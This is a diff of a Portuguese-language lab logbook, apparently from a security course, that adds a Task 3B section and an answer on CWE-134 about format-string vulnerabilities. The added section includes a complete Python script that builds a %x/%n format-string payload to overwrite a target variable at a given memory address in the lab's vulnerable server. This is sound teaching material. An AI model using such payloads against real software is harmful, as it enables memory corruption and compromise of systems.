@@ -173,7 +173,7 @@ __Imagem 5:__ execução do ataque.
 ![imagem](docs/logbook6/task2B.png)
 
 ### Task 3A:
-Nesta task iremos reescrever a varíavel no endereço __0x080e5068__ (obtido a partir do output do servidor na imagem 2) utilizando o especificador de formato __%n__ que escreve no endereço indicado o número de bytes já impressos até ao momento.
+Nesta task iremos reescrever a variável no endereço __0x080e5068__ (obtido a partir do output do servidor na imagem 2) utilizando o especificador de formato __%n__ que escreve no endereço indicado o número de bytes já impressos até ao momento.
 
 Para isso alteramos o código __mystr.py__ cujas váriaveis __adress__ e __specifier__ comtém agora os valores __0x080e5068__ e __'%n'__ respetivamente e executamos o mesmo ataque da task 2B. Assim verificamos que o valor original __0x11223344__ foi alterado para __0x0000012b__.
 
@@ -181,5 +181,51 @@ __Imagem 6:__ execução do ataque.
 ![imagem](docs/logbook6/task3A.png)
 
 ### Task 3B:
+Nesta task a variável que alteramos anteriormente tem que ser alterada para um valor específico (__0x5000__).
+Assim modificamos __mystr.py__ para que formate o primeiro valor hexadecimal lido com o número de espaços necessário para reescrever o valor correto.  
+Atingimos o valor obtido no código subtraindo ao valor do enunciado os 4 caracteres do endereço do começo mais os restantes 62 números hexadecimais lidos necessários para chegar novamente à string, cuja formatação os faz ter 9 caracteres cada.
+
+__mystr.py (modificado)__
+```python
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+adress  = 0x080e5068 # Endereço da mensagem secreta
+content[0:4] = (adress).to_bytes(4,byteorder='little')
+leng = 4
+
+# imprimir lixo até atingir a própria string
+# adicionar caracteres ao primeiro hexadecimal lido para atingir o valor da variável esperado
+
+# numero desejado - numero de caracteres imprimidos por outras funções.
+# "%8x\n"*62  ==> 62*9
+# adress  = 0x080e5068 ==> 4
+padding = int(0x5000) - (62*9 + 4) 
+s = f"%{padding}x"
+fmt = (s).encode('latin-1')
+content[leng:leng+len(fmt)] = fmt
+leng += len(fmt)
+
+s = "%8x\n"*62 # 64-2 para não consumir os primeiros 4 bytes
+fmt  = (s).encode('latin-1')
+content[leng:leng+len(fmt)] = fmt
+leng += len(fmt)
+
+# modificar a variável na posição dada pelos primeiros 4 bytes da string com %n
+specifier = "%n"
+fmt = (specifier).encode('latin-1')
+content[leng:leng+len(fmt)] = fmt
+
+with open('file.txt', 'wb') as f:
+    f.write(content)
+```
+
+Finalmente executamos o mesmo ataque da task 3A e verificamos que o valor da variável alvo é o desejado.
+
+__Imagem 7:__ execução do ataque.
+![imagem](docs/logbook6/task3B.png)
 
 ## Questão 2
+
+Qualquer programa que use dados controlados pelo utilizador diretamente como format string tem uma vulnerabilidade de __CWE-134__, mesmo que, na prática, não seja possível lançar um exploit.  
+Das tarefas realizadas, apenas a Task 1 funcionaria sempre nas condições descritas, porque é o único ataque que não depende do fornecimento de endereços como argumentos pelo atacante. As Tasks 2 e 3 exigem a leitura de endereços que apontem para as variáveis alvo, por isso essas tarefas falhariam se não existirem endereços úteis na stack. Ainda assim, Tasks 2 e 3 podem ser completadas se for possível descobrir na stack os endereços das variáveis que queremos atacar.
